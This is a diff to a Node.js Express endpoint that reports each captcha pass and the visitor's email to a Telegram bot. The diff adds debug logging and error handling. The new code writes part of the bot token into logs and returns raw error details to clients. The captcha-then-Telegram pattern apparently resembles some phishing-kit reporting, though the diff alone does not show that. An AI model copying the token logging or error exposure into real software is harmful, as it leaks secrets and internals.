@@ -1812,8 +1812,17 @@ app.post("/captcha-success", async (req, res) => {
     const botToken = process.env.BOT_TOKEN_CAPTCHA_PAGE;
     const chatId = process.env.CHAT_ID_CAPTCHA_PAGE;
 
+    console.log(`🔍 CAPTCHA endpoint - botToken exists: ${!!botToken}, chatId exists: ${!!chatId}`);
+
+    if (!botToken || !chatId) {
+      console.error("❌ Missing CAPTCHA env variables!");
+      return res.status(500).json({ error: "Missing CAPTCHA_PAGE env variables" });
+    }
+
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    await fetch(url, {
+    console.log(`📤 Sending to URL: ${url.substring(0, 50)}...`);
+
+    const response = await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -1823,10 +1832,18 @@ app.post("/captcha-success", async (req, res) => {
       })
     });
 
+    const responseData = await response.json();
+    console.log(`✅ CAPTCHA message response:`, responseData);
+
+    if (!response.ok) {
+      console.error(`❌ Telegram API error:`, responseData);
+      return res.status(500).json({ error: "Telegram API error", details: responseData });
+    }
+
     console.log(`✅ CAPTCHA success message sent for ${email}`);
     res.json({ ok: true });
   } catch (err) {
     console.error("❌ CAPTCHA success error:", err);
-    res.status(500).json({ error: "Internal server error" });
+    res.status(500).json({ error: err.message || "Internal server error" });
   }
 });
